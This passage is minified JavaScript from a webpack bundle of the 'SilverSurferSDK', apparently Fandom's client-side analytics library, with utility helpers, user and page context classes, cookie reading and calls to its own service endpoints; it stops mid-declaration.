!function(t,e){"object"==typeof exports&&"object"==typeof module?module.exports=e():"function"==typeof define&&define.amd?define([],e):"object"==typeof exports?exports.SilverSurferSDK=e():t.SilverSurferSDK=e()}(window,(()=>(()=>{var t={9996:t=>{"use strict";var e=function(t){return function(t){return!!t&&"object"==typeof t}(t)&&!function(t){var e=Object.prototype.toString.call(t);return"[object RegExp]"===e||"[object Date]"===e||function(t){return t.$$typeof===n}(t)}(t)},n="function"==typeof Symbol&&Symbol.for?Symbol.for("react.element"):60103;function r(t,e){return!1!==e.clone&&e.isMergeableObject(t)?s((n=t,Array.isArray(n)?[]:{}),t,e):t;var n}function o(t,e,n){return t.concat(e).map((function(t){return r(t,n)}))}function i(t){return Object.keys(t).concat(function(t){return Object.getOwnPropertySymbols?Object.getOwnPropertySymbols(t).filter((function(e){return t.propertyIsEnumerable(e)})):[]}(t))}function a(t,e){try{return e in t}catch(t){return!1}}function s(t,n,c){(c=c||{}).arrayMerge=c.arrayMerge||o,c.isMergeableObject=c.isMergeableObject||e,c.cloneUnlessOtherwiseSpecified=r;var u=Array.isArray(n);return u===Array.isArray(t)?u?c.arrayMerge(t,n,c):function(t,e,n){var o={};return n.isMergeableObject(t)&&i(t).forEach((function(e){o[e]=r(t[e],n)})),i(e).forEach((function(i){(function(t,e){return a(t,e)&&!(Object.hasOwnProperty.call(t,e)&&Object.propertyIsEnumerable.call(t,e))})(t,i)||(a(t,i)&&n.isMergeableObject(e[i])?o[i]=function(t,e){if(!e.customMerge)return s;var n=e.customMerge(t);return"function"==typeof n?n:s}(i,n)(t[i],e[i],n):o[i]=r(e[i],n))})),o}(t,n,c):r(n,c)}s.all=function(t,e){if(!Array.isArray(t))throw new Error("first argument should be an array");return t.reduce((function(t,n){return s(t,n,e)}),{})};var c=s;t.exports=c},8668:(t,e,n)=>{var r=n(1469);t.exports=function(){if(!arguments.length)return[];var t=arguments[0];return r(t)?t:[t]}},6384:(t,e,n)=>{var r=n(7040),o=n(4125),i=n(2117),a=n(7518),s=n(4705);function c(t){var e=-1,n=null==t?0:t.length;for(this.clear();++e<n;){var r=t[e];this.set(r[0],r[1])}}c.prototype.clear=r,c.prototype.delete=o,c.prototype.get=i,c.prototype.has=a,c.prototype.set=s,t.exports=c},7443:(t,e,n)=>{var r=n(2118);t.exports=function(t,e){return!(null==t||!t.length)&&r(t,e,0)>-1}},1196:t=>{t.exports=function(t,e,n){for(var r=-1,o=null==t?0:t.length;++r<o;)if(n(e,t[r]))return!0;return!1}},9932:t=>{t.exports=function(t,e){for(var n=-1,r=null==t?0:t.length,o=Array(r);++n<r;)o[n]=e(t[n],n,t);return o}},2908:t=>{t.exports=function(t,e){for(var n=-1,r=null==t?0:t.length;++n<r;)if(e(t[n],n,t))return!0;return!1}},4865:(t,e,n)=>{var r=n(9465),o=n(7813),i=Object.prototype.hasOwnProperty;t.exports=function(t,e,n){var a=t[e];i.call(t,e)&&o(a,n)&&(void 0!==n||e in t)||r(t,e,n)}},8470:(t,e,n)=>{var r=n(7813);t.exports=function(t,e){for(var n=t.length;n--;)if(r(t[n][0],e))return n;return-1}},9465:(t,e,n)=>{var r=n(8777);t.exports=function(t,e,n){"__proto__"==e&&r?r(t,e,{configurable:!0,enumerable:!0,value:n,writable:!0}):t[e]=n}},5990:t=>{t.exports=function(t){return t}},7786:t=>{t.exports=function(t,e){return null==t?void 0:t[e]}},4239:t=>{var e=Object.prototype.toString;t.exports=function(t){return e.call(t)}},2118:t=>{t.exports=function(t,e,n){for(var r=n-1,o=t.length;++r<o;)if(t[r]===e)return r;return-1}},939:(t,e,n)=>{var r=n(2492),o=n(7005);t.exports=function t(e,n,i,a,s){return e===n||(null==e||null==n||!o(e)&&!o(n)?e!=e&&n!=n:r(e,n,i,a,t,s))}},2492:(t,e,n)=>{var r=n(6384),o=n(7114),i=n(8351),a=n(6096),s=n(4160),c=n(1469),u=n(4144),l=n(6719),d="[object Arguments]",f="[object Array]",p="[object Object]",v=Object.prototype.hasOwnProperty;t.exports=function(t,e,n,g,h,y){var b=c(t),m=c(e),w=b?f:s(t),S=m?f:s(e),O=(w=w==d?p:w)==p,_=(S=S==d?p:S)==p,E=w==S;if(E&&u(t)){if(!u(e))return!1;b=!0,O=!1}if(E&&!O)return y||(y=new r),b||l(t)?o(t,e,n,g,h,y):i(t,e,w,n,g,h,y);if(!(1&n)){var I=O&&v.call(t,"__wrapped__"),x=_&&v.call(e,"__wrapped__");if(I||x){var A=I?t.value():t,j=x?e.value():e;return y||(y=new r),h(A,j,n,g,y)}}return!!E&&(y||(y=new r),a(t,e,n,g,h,y))}},7206:t=>{t.exports=function(t){return t}},280:(t,e,n)=>{var r=n(5569)(Object.keys,Object);t.exports=r},9877:t=>{var e=Math.floor,n=Math.random;t.exports=function(t,r){return t+e(n()*(r-t+1))}},4259:t=>{t.exports=function(t,e,n){var r=-1,o=t.length;e<0&&(e=-e>o?0:o+e),(n=n>o?o:n)<0&&(n+=o),o=e>n?0:n-e>>>0,e>>>=0;for(var i=Array(o);++r<o;)i[r]=t[r+e];return i}},5652:(t,e,n)=>{var r=n(8668),o=n(7443),i=n(1196),a=n(4757),s=n(3593),c=n(1814);t.exports=function(t,e,n){var u=-1,l=o,d=t.length,f=!0,p=[],v=p;if(n)f=!1,l=i;else if(d>=200){var g=e?null:s(t);if(g)return c(g);f=!1,l=a,v=new r}else v=e?[]:p;t:for(;++u<d;){var h=t[u],y=e?e(h):h;if(h=n||0!==h?h:0,f&&y==y){for(var b=v.length;b--;)if(v[b]===y)continue t;e&&v.push(y),p.push(h)}else l(v,y,n)||(v!==p&&v.push(y),p.push(h))}return p}},7406:(t,e,n)=>{var r=n(1811),o=n(928),i=n(292),a=n(327);t.exports=function(t,e){return e=r(e,t),null==(t=i(t,e))||delete t[a(o(e))]}},4757:(t,e,n)=>{var r=n(2118);t.exports=function(t,e){return!(null==t||!t.length)&&r(t,e,0)>-1}},1811:(t,e,n)=>{var r=n(1469);t.exports=function(){if(!arguments.length)return[];var t=arguments[0];return r(t)?t:[t]}},8363:(t,e,n)=>{var r=n(4865),o=n(9465);t.exports=function(t,e,n,i){var a=!n;n||(n={});for(var s=-1,c=e.length;++s<c;){var u=e[s],l=i?i(n[u],t[u],u,n,t):void 0;void 0===l&&(l=t[u]),a?o(n,u,l):r(n,u,l)}return n}},3593:t=>{t.exports=function(){}},696:(t,e,n)=>{var r=n(8630);t.exports=function(t){return r(t)?void 0:t}},8777:(t,e,n)=>{var r=n(852),o=function(){try{var t=r(Object,"defineProperty");return t({},"",{}),t}catch(t){}}();t.exports=o},7114:(t,e,n)=>{var r=n(8668),o=n(2908),i=n(4757);t.exports=function(t,e,n,a,s,c){var u=1&n,l=t.length,d=e.length;if(l!=d&&!(u&&d>l))return!1;var f=c.get(t),p=c.get(e);if(f&&p)return f==e&&p==t;var v=-1,g=!0,h=2&n?new r:void 0;for(c.set(t,e),c.set(e,t);++v<l;){var y=t[v],b=e[v];if(a)var m=u?a(b,y,v,e,t,c):a(y,b,v,t,e,c);if(void 0!==m){if(m)continue;g=!1;break}if(h){if(!o(e,(function(t,e){if(!i(h,e)&&(y===t||s(y,t,n,a,c)))return h.push(e)}))){g=!1;break}}else if(y!==b&&!s(y,b,n,a,c)){g=!1;break}}return c.delete(t),c.delete(e),g}},8351:t=>{t.exports=function(t,e){return t===e||t!=t&&e!=e}},6096:(t,e,n)=>{var r=n(8234),o=Object.prototype.hasOwnProperty;t.exports=function(t,e,n,i,a,s){var c=1&n,u=r(t),l=u.length;if(l!=r(e).length&&!c)return!1;for(var d=l;d--;){var f=u[d];if(!(c?f in e:o.call(e,f)))return!1}var p=s.get(t),v=s.get(e);if(p&&v)return p==e&&v==t;var g=!0;s.set(t,e),s.set(e,t);for(var h=c;++d<l;){var y=t[f=u[d]],b=e[f];if(i)var m=c?i(b,y,f,e,t,s):i(y,b,f,t,e,s);if(!(void 0===m?y===b||a(y,b,n,i,s):m)){g=!1;break}h||(h="constructor"==f)}if(g&&!h){var w=t.constructor,S=e.constructor;w==S||!("constructor"in t)||!("constructor"in e)||"function"==typeof w&&w instanceof w&&"function"==typeof S&&S instanceof S||(g=!1)}return s.delete(t),s.delete(e),g}},9021:t=>{t.exports=function(t){return t}},8234:(t,e,n)=>{var r=n(5569)(Object.keys,Object);t.exports=r},6904:t=>{t.exports=function(t){var e=[];if(null!=t)for(var n in Object(t))e.push(n);return e}},852:t=>{t.exports=function(t,e){return null==t?void 0:t[e]}},5924:(t,e,n)=>{var r=n(5569)(Object.getPrototypeOf,Object);t.exports=r},4160:t=>{var e=Object.prototype.toString;t.exports=function(t){return e.call(t)}},6612:t=>{t.exports=function(){return!1}},5726:t=>{t.exports=function(){return!1}},7040:t=>{t.exports=function(){this.__data__=[],this.size=0}},4125:(t,e,n)=>{var r=n(8470),o=Array.prototype.splice;t.exports=function(t){var e=this.__data__,n=r(e,t);return!(n<0||(n==e.length-1?e.pop():o.call(e,n,1),--this.size,0))}},2117:(t,e,n)=>{var r=n(8470);t.exports=function(t){var e=this.__data__,n=r(e,t);return n<0?void 0:e[n][1]}},7518:(t,e,n)=>{var r=n(8470);t.exports=function(t){return r(this.__data__,t)>-1}},4705:(t,e,n)=>{var r=n(8470);t.exports=function(t,e){var n=this.__data__,o=r(n,t);return o<0?(++this.size,n.push([t,e])):n[o][1]=e,this}},5569:t=>{t.exports=function(t,e){return function(n){return t(e(n))}}},292:t=>{t.exports=function(t){return t}},1814:t=>{t.exports=function(){return[]}},327:t=>{t.exports=function(t){return t}},7813:t=>{t.exports=function(t,e){return t===e||t!=t&&e!=e}},7361:(t,e,n)=>{var r=n(7786);t.exports=function(t,e,n){var o=null==t?void 0:r(t,e);return void 0===o?n:o}},5694:t=>{t.exports=function(){return!1}},1469:t=>{var e=Array.isArray;t.exports=e},8612:(t,e,n)=>{var r=n(3560),o=n(1780);t.exports=function(t){return null!=t&&o(t.length)&&!r(t)}},4144:t=>{t.exports=function(){return!1}},1609:(t,e,n)=>{var r=n(280),o=n(4160),i=n(5694),a=n(1469),s=n(8612),c=n(4144),u=n(5726),l=n(6719),d=Object.prototype.hasOwnProperty;t.exports=function(t){if(null==t)return!0;if(s(t)&&(a(t)||"string"==typeof t||"function"==typeof t.splice||c(t)||l(t)||i(t)))return!t.length;var e=o(t);if("[object Map]"==e||"[object Set]"==e)return!t.size;if(u(t))return!r(t).length;for(var n in t)if(d.call(t,n))return!1;return!0}},8446:(t,e,n)=>{var r=n(939);t.exports=function(t,e){return r(t,e)}},3560:(t,e,n)=>{var r=n(4239),o=n(3218);t.exports=function(t){if(!o(t))return!1;var e=r(t);return"[object Function]"==e||"[object GeneratorFunction]"==e||"[object AsyncFunction]"==e||"[object Proxy]"==e}},1780:t=>{t.exports=function(t){return"number"==typeof t&&t>-1&&t%1==0&&t<=9007199254740991}},3218:t=>{t.exports=function(t){var e=typeof t;return null!=t&&("object"==e||"function"==e)}},7005:t=>{t.exports=function(t){return null!=t&&"object"==typeof t}},8630:(t,e,n)=>{var r=n(4239),o=n(5924),i=n(7005),a=Function.prototype,s=Object.prototype,c=a.toString,u=s.hasOwnProperty,l=c.call(Object);t.exports=function(t){if(!i(t)||"[object Object]"!=r(t))return!1;var e=o(t);if(null===e)return!0;var n=u.call(e,"constructor")&&e.constructor;return"function"==typeof n&&n instanceof n&&c.call(n)==l}},6719:t=>{t.exports=function(){return!1}},928:t=>{t.exports=function(t){var e=null==t?0:t.length;return e?t[e-1]:void 0}},7557:(t,e,n)=>{var r=n(9932),o=n(5990),i=n(7406),a=n(1811),s=n(8363),c=n(696),u=n(9021),l=n(6904),d=u((function(t,e){var n={};if(null==t)return n;var u=!1;e=r(e,(function(e){return e=a(e,t),u||(u=e.length>1),e})),s(t,l(t),n),u&&(n=o(n,7,c));for(var d=e.length;d--;)i(n,e[d]);return n}));t.exports=d},3608:(t,e,n)=>{var r=n(9877),o=n(6612),i=n(8601),a=parseFloat,s=Math.min,c=Math.random;t.exports=function(t,e,n){if(n&&"boolean"!=typeof n&&o(t,e,n)&&(e=n=void 0),void 0===n&&("boolean"==typeof e?(n=e,e=void 0):"boolean"==typeof t&&(n=t,t=void 0)),void 0===t&&void 0===e?(t=0,e=1):(t=i(t),void 0===e?(e=t,t=0):e=i(e)),t>e){var u=t;t=e,e=u}if(n||t%1||e%1){var l=c();return s(t+l*(e-t+a("1e-"+((l+"").length-1))),e)}return r(t,e)}},9579:(t,e,n)=>{var r=n(4259),o=n(554);t.exports=function(t,e,n){var i=null==t?0:t.length;return i?(e=n||void 0===e?1:o(e),r(t,(e=i-e)<0?0:e,i)):[]}},8601:t=>{t.exports=function(t){return t}},554:t=>{t.exports=function(t){return t}},4908:(t,e,n)=>{var r=n(5652);t.exports=function(t){return t&&t.length?r(t):[]}},5578:(t,e,n)=>{var r=n(7206),o=n(5652);t.exports=function(t,e){return t&&t.length?o(t,r(e,2)):[]}}},e={};function n(r){var o=e[r];if(void 0!==o)return o.exports;var i=e[r]={exports:{}};return t[r](i,i.exports,n),i.exports}n.n=t=>{var e=t&&t.__esModule?()=>t.default:()=>t;return n.d(e,{a:e}),e},n.d=(t,e)=>{for(var r in e)n.o(e,r)&&!n.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:e[r]})},n.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e),n.r=t=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})};var r={};return(()=>{"use strict";n.r(r),n.d(r,{ACTION:()=>Ri,addAction:()=>Bi,addActiveDataAction:()=>Li,addInteraction:()=>zi,default:()=>Ji,getActions:()=>Mi,getAllActions:()=>Ui,getContext:()=>qi,getGalactusUserProfile:()=>Ki,getUserProfile:()=>Fi,getVersionHash:()=>Gi,isCrossdomainDisabled:()=>$i,isCrossdomainFinished:()=>Vi,isInitialized:()=>Hi,isReady:()=>Wi,registerClient:()=>Ti,trackPageview:()=>Ni});const t=Array.isArray,e=function(){if(!arguments.length)return[];var e=arguments[0];return t(e)?e:[e]},o=function(t,e,n){for(var r=n-1,o=t.length;++r<o;)if(t[r]===e)return r;return-1},i=function(t,e){return!(null==t||!t.length)&&o(t,e,0)>-1},a=function(t,e){return!(null==t||!t.length)&&o(t,e,0)>-1},s=function(t,n){return t&&t.length?function(t,n,r){var o=-1,s=i,c=t.length,u=!0,l=[],d=l;if(c>=200){if(!n&&void 0)return[];u=!1,s=a,d=new e}else d=n?[]:l;t:for(;++o<c;){var f=t[o],p=n?n(f):f;if(f=0!==f?f:0,u&&p==p){for(var v=d.length;v--;)if(d[v]===p)continue t;n&&d.push(p),l.push(f)}else s(d,p,r)||(d!==l&&d.push(p),l.push(f))}return l}(t,n):[]};function c(t,e,n,r,o,i,a){try{var s=t[i](a),c=s.value}catch(t){return void n(t)}s.done?e(c):Promise.resolve(c).then(r,o)}function u(t){return function(){var e=this,n=arguments;return new Promise((function(r,o){var i=t.apply(e,n);function a(t){c(i,r,o,a,s,"next",t)}function s(t){c(i,r,o,a,s,"throw",t)}a(void 0)}))}}function l(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}function d(t,e,n){return e&&l(t.prototype,e),n&&l(t,n),Object.defineProperty(t,"prototype",{writable:!1}),t}var f,p,v=function(t,e){return function(t){var e=function(t){var e,n=Object.prototype,r=n.hasOwnProperty,o="function"==typeof Symbol?Symbol:{},i=o.iterator||"@@iterator",a=o.asyncIterator||"@@asyncIterator",s=o.toStringTag||"@@toStringTag";function c(t,e,n){return Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}),t[e]}try{c({},"")}catch(t){c=function(t,e,n){return t[e]=n}}function u(t,e,n,r){var o=e&&e.prototype instanceof h?e:h,i=Object.create(o.prototype),a=new j(r||[]);return i._invoke=function(t,e,n){var r=d;return function(o,i){if(r===p)throw new Error("Generator is already running");if(r===v){if("throw"===o)throw i;return k()}for(n.method=o,n.arg=i;;){var a=n.delegate;if(a){var s=I(a,n);if(s){if(s===g)continue;return s}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if(r===d)throw r=v,n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);r=p;var c=l(t,e,n);if("normal"===c.type){if(r=n.done?v:f,c.arg===g)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(r=v,n.method="throw",n.arg=c.arg)}}}(t,n,a),i}function l(t,e,n){try{return{type:"normal",arg:t.call(e,n)}}catch(t){return{type:"throw",arg:t}}}t.wrap=u;var d="suspendedStart",f="suspendedYield",p="executing",v="completed",g={};function h(){}function y(){}function b(){}var m={};c(m,i,(function(){return this}));var w=Object.getPrototypeOf,S=w&&w(w(D([])));S&&S!==n&&r.call(S,i)&&(m=S);var O=b.prototype=h.prototype=Object.create(m);function _(t){["next","throw","return"].forEach((function(e){c(t,e,(function(t){return this._invoke(e,t)}))}))}function E(t,e){function n(o,i,a,s){var c=l(t[o],t,i);if("throw"!==c.type){var u=c.arg,d=u.value;return d&&"object"==typeof d&&r.call(d,"__await")?e.resolve(d.__await).then((function(t){n("next",t,a,s)}),(function(t){n("throw",t,a,s)})):e.resolve(d).then((function(t){u.value=t,a(u)}),(function(t){return n("throw",t,a,s)}))}s(c.arg)}var o;this._invoke=function(t,r){function i(){return new e((function(e,o){n(t,r,e,o)}))}return o=o?o.then(i,i):i()}}function I(t,n){var r=t.iterator[n.method];if(r===e){if(n.delegate=null,"throw"===n.method){if(t.iterator.return&&(n.method="return",n.arg=e,I(t,n),"throw"===n.method))return g;n.method="throw",n.arg=new TypeError("The iterator does not provide a 'throw' method")}return g}var o=l(r,t.iterator,n.arg);if("throw"===o.type)return n.method="throw",n.arg=o.arg,n.delegate=null,g;var i=o.arg;return i?i.done?(n[t.resultName]=i.value,n.next=t.nextLoc,"return"!==n.method&&(n.method="next",n.arg=e),n.delegate=null,g):i:(n.method="throw",n.arg=new TypeError("iterator result is not an object"),n.delegate=null,g)}function x(t){var e={tryLoc:t[0]};1 in t&&(e.catchLoc=t[1]),2 in t&&(e.finallyLoc=t[2],e.afterLoc=t[3]),this.tryEntries.push(e)}function A(t){var e=t.completion||{};e.type="normal",delete e.arg,t.completion=e}function j(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(x,this),this.reset(!0)}function D(t){if(t){var n=t[i];if(n)return n.call(t);if("function"==typeof t.next)return t;if(!isNaN(t.length)){var o=-1,a=function n(){for(;++o<t.length;)if(r.call(t,o))return n.value=t[o],n.done=!1,n;return n.value=e,n.done=!0,n};return a.next=a}}return{next:k}}function k(){return{value:e,done:!0}}return y.prototype=b,c(O,"constructor",b),c(b,"constructor",y),y.displayName=c(b,s,"GeneratorFunction"),t.isGeneratorFunction=function(t){var e="function"==typeof t&&t.constructor;return!!e&&(e===y||"GeneratorFunction"===(e.displayName||e.name))},t.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,b):(t.__proto__=b,c(t,s,"GeneratorFunction")),t.prototype=Object.create(O),t},t.awrap=function(t){return{__await:t}},_(E.prototype),c(E.prototype,a,(function(){return this})),t.AsyncIterator=E,t.async=function(e,n,r,o,i){void 0===i&&(i=Promise);var a=new E(u(e,n,r,o),i);return t.isGeneratorFunction(n)?a:a.next().then((function(t){return t.done?t.value:a.next()}))},_(O),c(O,s,"Generator"),c(O,i,(function(){return this})),c(O,"toString",(function(){return"[object Generator]"})),t.keys=function(t){var e=[];for(var n in t)e.push(n);return e.reverse(),function n(){for(;e.length;){var r=e.pop();if(r in t)return n.value=r,n.done=!1,n}return n.done=!0,n}},t.values=D,j.prototype={constructor:j,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=e,this.done=!1,this.delegate=null,this.method="next",this.arg=e,this.tryEntries.forEach(A),!t)for(var n in this)"t"===n.charAt(0)&&r.call(this,n)&&!isNaN(+n.slice(1))&&(this[n]=e)},stop:function(){this.done=!0;var t=this.tryEntries[0].completion;if("throw"===t.type)throw t.arg;return this.rval},dispatchException:function(t){if(this.done)throw t;var n=this;function o(r,o){return s.type="throw",s.arg=t,n.next=r,o&&(n.method="next",n.arg=e),!!o}for(var i=this.tryEntries.length-1;i>=0;--i){var a=this.tryEntries[i],s=a.completion;if("root"===a.tryLoc)return o("end");if(a.tryLoc<=this.prev){var c=r.call(a,"catchLoc"),u=r.call(a,"finallyLoc");if(c&&u){if(this.prev<a.catchLoc)return o(a.catchLoc,!0);if(this.prev<a.finallyLoc)return o(a.finallyLoc)}else if(c){if(this.prev<a.catchLoc)return o(a.catchLoc,!0)}else{if(!u)throw new Error("try statement without catch or finally");if(this.prev<a.finallyLoc)return o(a.finallyLoc)}}}},abrupt:function(t,e){for(var n=this.tryEntries.length-1;n>=0;--n){var o=this.tryEntries[n];if(o.tryLoc<=this.prev&&r.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var i=o;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=e&&e<=i.finallyLoc&&(i=null);var a=i?i.completion:{};return a.type=t,a.arg=e,i?(this.method="next",this.next=i.finallyLoc,g):this.complete(a)},complete:function(t,e){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&e&&(this.next=e),g},finish:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.finallyLoc===t)return this.complete(n.completion,n.afterLoc),A(n),g}},catch:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.tryLoc===t){var r=n.completion;if("throw"===r.type){var o=r.arg;A(n)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(t,n,r){return this.delegate={iterator:D(t),resultName:n,nextLoc:r},"next"===this.method&&(this.arg=e),g}},t}(t.exports);try{regeneratorRuntime=e}catch(t){"object"==typeof globalThis?globalThis.regeneratorRuntime=e:Function("r","regeneratorRuntime = r")(e)}}(e={exports:{}}),e.exports}(),g=function(){function t(){this.id=t.UNKNOWN_USER,this.language=void 0}var e=t.prototype;return e.reset=function(){this.id=t.UNKNOWN_USER,this.language=void 0},t.getDefault=function(){return new t},t.getAnon=function(){var e=new t;return e.id=t.ANON_USER,e},e.apply=function(e){return e instanceof t&&(this.id=e.id,null!=e&&e.language&&(this.language=e.language)),this},t.fromContext=function(e){return t.getDefault().apply(e)},t.fromTransport=function(e){var n=t.getDefault();if("object"==typeof e&&null!=e&&e.id){var r=e.id;"number"==typeof r?n.id=r:"string"==typeof r&&(n.id=parseInt(r,10)),n.language=null==e?void 0:e.lang}return n},t.fromWindow=function(){var e=window;return null!=e&&e._ulc&&"object"==typeof e._ulc?t.fromTransport(e._ulc):t.getDefault()},e.toTransport=function(){return{id:this.id,lang:this.language}},e.toString=function(){return JSON.stringify(this.toTransport())},e.updateWindow=function(){window._ulc=this.toTransport()},e.toScript=function(){return"window._ulc = "+this.toString()+";"},d(t,[{key:"lang",get:function(){return null==this?void 0:this.language}},{key:"isUnknown",get:function(){return this.id===t.UNKNOWN_USER}},{key:"isAnon",get:function(){return this.isUnknown||this.id===t.ANON_USER}},{key:"anon",get:function(){return this.isAnon}}]),t}();g.UNKNOWN_USER=-1,g.ANON_USER=0,function(t){t.UNKNOWN="unknown",t.MEDIAWIKI="mw",t.DISCUSSIONS="dis",t.TRIVIA="trivia",t.F2="f2",t.FANHUB="fanhub",t.VIDEO="video"}(p||(p={}));var h,y,b,m=((f={})[p.MEDIAWIKI]=!0,f[p.DISCUSSIONS]=!0,f[p.TRIVIA]=!0,f[p.F2]=!0,f[p.FANHUB]=!0,f[p.VIDEO]=!0,f),w=function(){function t(){this.$time=0,this.product=p.UNKNOWN,this.productId=void 0,this.$time=Date.now()}var e=t.prototype;return e.reset=function(){this.product=p.UNKNOWN,this.productId=void 0,this.productVariant=void 0,this.productCategory=void 0,this.page=void 0,this.pageId=void 0,this.pageLanguage=void 0,this.adTags=void 0,this.$time=Date.now()},t.getDefault=function(){return new t},e.zeroTime=function(){return this.$time=0,this},e.apply=function(e){return e instanceof t&&(e.isUnknown||(this.product=e.product),null!=e&&e.productId&&"string"==typeof e.productId&&e.productId.length>0&&(this.productId=e.productId),null!=e&&e.productVariant&&(this.productVariant=e.productVariant),null!=e&&e.productCategory&&(this.productCategory=e.productCategory),null!=e&&e.page&&(this.page=e.page),null!=e&&e.pageId&&(this.pageId=e.pageId),null!=e&&e.pageLanguage&&(this.pageLanguage=e.pageLanguage),null!=e&&e.adTags&&(this.adTags=e.adTags),null!=e&&e.$time&&"number"==typeof e.$time&&e.$time>0&&(this.$time=e.$time)),this},t.fromContext=function(e){return t.getDefault().apply(e)},t.fromTransport=function(e){var n=t.getDefault();return e.p&&e.pId&&"number"==typeof e.time&&(n.product=e.p,n.productId=e.pId,n.productVariant=null==e?void 0:e.pVar,n.productCategory=null==e?void 0:e.pCat,n.page=null==e?void 0:e.pg,n.pageId=null==e?void 0:e.pgId,n.pageLanguage=null==e?void 0:e.pgLang,n.adTags=null==e?void 0:e.adTags,n.$time=e.time>0?e.time:Date.now()),n},t.fromWindow=function(){var e=window;return null!=e&&e._plc&&"object"==typeof e._plc?t.fromTransport(e._plc):t.getDefault()},e.toTransport=function(t){void 0===t&&(t=!1);var e={p:this.product,pId:this.productId,pVar:null==this?void 0:this.productVariant,pCat:null==this?void 0:this.productCategory,pg:null==this?void 0:this.page,pgId:null==this?void 0:this.pageId,pgLang:null==this?void 0:this.pageLanguage,adTags:null==this?void 0:this.adTags,time:this.time};return t&&(e.time=0),e},e.toString=function(t){return void 0===t&&(t=!1),JSON.stringify(this.toTransport(t))},e.updateWindow=function(t){void 0===t&&(t=!1);var e=window;e._plc=this.toTransport(t),t&&(e._plc.time=Date.now())},e.toScript=function(t){void 0===t&&(t=!1);var e="window._plc = "+this.toString(t)+";";return t&&(e+="window._plc.time = Date.now();"),e},d(t,[{key:"time",get:function(){return this.$time}},{key:"isUnknown",get:function(){return"string"!=typeof this.product||!m[this.product]}},{key:"isValid",get:function(){return!this.isUnknown&&"string"==typeof this.productId&&this.$time>0}}]),t}();function S(t,e,n){return void 0===e&&(e="/"),void 0===n&&(n={}),fetch(function(t){var e,n,r=null==(e=window)||null==(n=e.location)?void 0:n.hostname;if(r){if(r.endsWith("fandom.com"))return"https://services.fandom.com/"+t;if(r.endsWith("fandom-dev.us"))return"https://services.fandom-dev.us/"+t}return"http://"+t}(t)+e,n).then((function(n){return"opaque"===n.type||n.ok||401===n.status||404===n.status||console.error("fetch Error",{serviceName:t,path:e,response:n}),n.json()}))}function O(){return _.apply(this,arguments)}function _(){return(_=u(v.mark((function t(){var e,n,r;return v.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,S("whoami","/",{credentials:"include"});case 3:return n=t.sent,r=null!=(e=null==n?void 0:n.userId)?e:""+g.ANON_USER,t.abrupt("return",parseInt(r,10));case 8:t.prev=8,t.t0=t.catch(0);case 10:return t.abrupt("return",g.ANON_USER);case 11:case"end":return t.stop()}}),t,null,[[0,8]])})))).apply(this,arguments)}function E(){return(E=u(v.mark((function t(){var e;return v.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!(e=g.fromWindow()).isUnknown){t.next=12;break}return t.prev=2,t.next=5,O();case 5:e.id=t.sent,t.next=12;break;case 8:return t.prev=8,t.t0=t.catch(2),console.debug("Failed, falling back to default user context",t.t0),t.abrupt("return",g.getDefault());case 12:return t.abrupt("return",e);case 13:case"end":return t.stop()}}),t,null,[[2,8]])})))).apply(this,arguments)}function I(t){if("object"!=typeof t)return{};for(var e={},n=0,r=Object.entries(t);n<r.length;n++){var o=r[n],i=o[0],a=o[1];a&&(e[i]=a.reduce((function(t,e){return t[e]=1,t}),{}))}return e}function x(t){var e=document.cookie.match(RegExp("(?:^|;\\s*)"+function(t){return t.replace(/([.*+?\^$(){}|\[\]\/\\])/g,"\\$1")}(t)+"=([^;]*)"));return e?e[1]:void 0}function A(){return x("wikia_beacon_id")||""}function j(){return w.fromWindow()}function D(){return g.fromWindow()}!function(t){t.INIT="roots-initial",t.LOADED="roots-loaded"}(h||(h={})),function(t){t.SS_PRE_BOOTSTRAP="ss_pre_bootstrap",t.SS_SDK_START="ss_sdk_start",t.SS_SDK_LOADED="ss_sdk_loaded",t.SS_SDK_READY="ss_sdk_ready",t.SS_CROSS_DOMAIN_READY="ss_cross_domain_ready",t.SS_CROSS_DOMAIN_REGISTER_START="ss_cross_domain_register_start",t.SS_CROSS_DOMAIN_REGISTER_ALL_PAGES_DONE="ss_cross_domain_register_all_pages_done"}(y||(y={})),function(t){t.PF_START="pf_start",t.PF_LOADED="pf_loaded",t.PF_READY="pf_ready"}(b||(b={}));const k=Object.values({SilverSurfer:"silversurfer",PathfinderExperiments:"pf-experiments",ClientSide:"browser-client-",Custom:"custom-"});var P,C;!function(t){t.CATEGORY="category",t.EVENT="event",t.LABEL="label",t.ACTION="action",t.VALUE="value",t.NON_INTERACTIVE="nonInteractive",t.IS_DEBUG="isDebug"}(P||(P={})),function(t){t.EXPERIMENT_VARIANT="experimentVariant",t.SS_VERSION="silverSurferVersion",t.AD_PVUID="pvUID",t.BEACON_ID="beaconId"}(C||(C={}));const R=[...Object.values(C),...Object.values(P)];function N(){var t,e,n;return null!==(n=null===(e=null===(t=null===window||void 0===window?void 0:window.google_tag_manager)||void 0===t?void 0:t.dataLayer)||void 0===e?void 0:e.gtmDom)&&void 0!==n&&n}function 